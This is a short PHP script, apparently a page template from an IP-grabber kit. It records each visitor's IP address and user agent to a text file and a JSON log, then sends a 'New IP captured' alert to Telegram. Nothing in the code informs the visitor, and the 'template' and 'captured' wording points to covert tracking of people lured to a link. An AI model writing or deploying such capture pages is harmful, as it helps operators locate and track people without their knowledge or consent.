<?php
// ip_template.php - generic IP capture with JSON logging and optional Telegram notification
require_once __DIR__.'/../logger.php';

function get_client_ip() {
    $keys = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ips = explode(',', $_SERVER[$key]);
            return trim($ips[0]);
        }
    }
    return 'UNKNOWN';
}

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';

// Legacy compatibility – keep original text file if it exists
$legacyFile = __DIR__.'/ip.txt';
$legacyLine = "IP: $ip | UA: $ua\n";
file_put_contents($legacyFile, $legacyLine, FILE_APPEND | LOCK_EX);

// Structured JSON logging
log_event('ip', ['ip' => $ip, 'user_agent' => $ua]);

tg_notify("🛰 New IP captured: $ip");
?>
